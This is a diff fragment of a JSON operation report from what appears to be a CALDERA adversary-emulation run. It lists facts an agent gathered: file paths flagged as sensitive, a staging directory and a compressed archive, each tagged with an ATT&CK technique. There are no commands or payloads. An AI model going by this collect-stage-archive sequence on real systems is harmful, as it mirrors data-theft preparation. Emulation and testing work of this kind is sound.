+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/d82fe0d5-98c0-4674-8e3f-93cf0d0cdaae.yml) : has_extension : file.sensitive.extension(yml)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/data/sources/d82fe0d5-98c0-4674-8e3f-93cf0d0cdaae.yml",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/data/sources/d82fe0d5-98c0-4674-8e3f-93cf0d0cdaae.yml",
+      "created": "2022-08-13T20:45:34Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "9bf08c5d-1f7b-464a-bd0e-67c9e9da4fb0"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/12ab72eb-4f81-4ef5-9208-5b674bab953c.yml) : has_extension : file.sensitive.extension(yml)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/data/sources/12ab72eb-4f81-4ef5-9208-5b674bab953c.yml",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/data/sources/12ab72eb-4f81-4ef5-9208-5b674bab953c.yml",
+      "created": "2022-08-13T20:45:34Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "9bf08c5d-1f7b-464a-bd0e-67c9e9da4fb0"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/37ef0c68-f47f-4a61-b96b-4662eccf1e22.yml) : has_extension : file.sensitive.extension(yml)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/data/sources/37ef0c68-f47f-4a61-b96b-4662eccf1e22.yml",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/data/sources/37ef0c68-f47f-4a61-b96b-4662eccf1e22.yml",
+      "created": "2022-08-13T20:45:34Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "9bf08c5d-1f7b-464a-bd0e-67c9e9da4fb0"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/56452120-c090-4728-a498-a07a8ec85df3.yml) : has_extension : file.sensitive.extension(yml)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/data/sources/56452120-c090-4728-a498-a07a8ec85df3.yml",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/data/sources/56452120-c090-4728-a498-a07a8ec85df3.yml",
+      "created": "2022-08-13T20:45:34Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "a238a082-063e-4f5a-a054-03e8276ae322"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/fact_relationships.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/fact_relationships.png",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/fact_relationships.png",
+      "created": "2022-08-13T20:46:07Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "a238a082-063e-4f5a-a054-03e8276ae322"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/debrief_attack_path.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/debrief_attack_path.png",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/debrief_attack_path.png",
+      "created": "2022-08-13T20:46:07Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "a238a082-063e-4f5a-a054-03e8276ae322"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/privileged_persistence_state_machine.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/privileged_persistence_state_machine.png",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/privileged_persistence_state_machine.png",
+      "created": "2022-08-13T20:46:07Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "a238a082-063e-4f5a-a054-03e8276ae322"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/_build/html/_static/plus.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/_build/html/_static/plus.png",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/_build/html/_static/plus.png",
+      "created": "2022-08-13T20:46:07Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "a238a082-063e-4f5a-a054-03e8276ae322"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/_build/html/_static/file.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/_build/html/_static/file.png",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/_build/html/_static/file.png",
+      "created": "2022-08-13T20:46:07Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "46001561-9898-40a5-b95f-690566fade0c"
+      ],
+      "trait": "host.dir.staged",
+      "relationships": [
+        "host.dir.staged(/home/kusubyan/dev/staged)"
+      ],
+      "unique": "host.dir.staged/home/kusubyan/dev/staged",
+      "limit_count": -1,
+      "technique_id": "T1074.001",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/staged",
+      "created": "2022-08-13T20:46:41Z",
+      "score": 2,
+      "name": "host.dir.staged"
+    },
+    {
+      "links": [
+        "9a23937f-72f1-40a3-b8b0-8c0e7fe4c239"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/usr/share/sounds/sound-icons/cembalo-10.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "unique": "host.file.path/usr/share/sounds/sound-icons/cembalo-10.wav",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/usr/share/sounds/sound-icons/cembalo-10.wav",
+      "created": "2022-08-13T20:50:02Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "9a23937f-72f1-40a3-b8b0-8c0e7fe4c239"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/usr/share/sounds/sound-icons/cembalo-12.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "unique": "host.file.path/usr/share/sounds/sound-icons/cembalo-12.wav",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/usr/share/sounds/sound-icons/cembalo-12.wav",
+      "created": "2022-08-13T20:50:02Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "9a23937f-72f1-40a3-b8b0-8c0e7fe4c239"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/usr/share/sounds/sound-icons/gummy-cat-2.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "unique": "host.file.path/usr/share/sounds/sound-icons/gummy-cat-2.wav",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/usr/share/sounds/sound-icons/gummy-cat-2.wav",
+      "created": "2022-08-13T20:50:02Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "9a23937f-72f1-40a3-b8b0-8c0e7fe4c239"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/usr/share/sounds/sound-icons/glass-water-1.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "unique": "host.file.path/usr/share/sounds/sound-icons/glass-water-1.wav",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/usr/share/sounds/sound-icons/glass-water-1.wav",
+      "created": "2022-08-13T20:50:02Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "9a23937f-72f1-40a3-b8b0-8c0e7fe4c239"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/usr/share/sounds/sound-icons/trumpet-1.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "unique": "host.file.path/usr/share/sounds/sound-icons/trumpet-1.wav",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/usr/share/sounds/sound-icons/trumpet-1.wav",
+      "created": "2022-08-13T20:50:02Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "c6c89f55-5f00-46c2-89ca-4f9c48f4334f"
+      ],
+      "trait": "host.dir.compress",
+      "relationships": [
+        "host.dir.compress(/home/kusubyan/dev/staged.tar.gz)"
+      ],
+      "unique": "host.dir.compress/home/kusubyan/dev/staged.tar.gz",
+      "limit_count": -1,
+      "technique_id": "T1560.001",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/staged.tar.gz",
+      "created": "2022-08-13T20:50:19Z",
+      "score": 1,
+      "name": "host.dir.compress"
+    }
+  ],
+  "skipped_abilities": [
+    {
+      "crqmfu": []
+    }
+  ]
+}
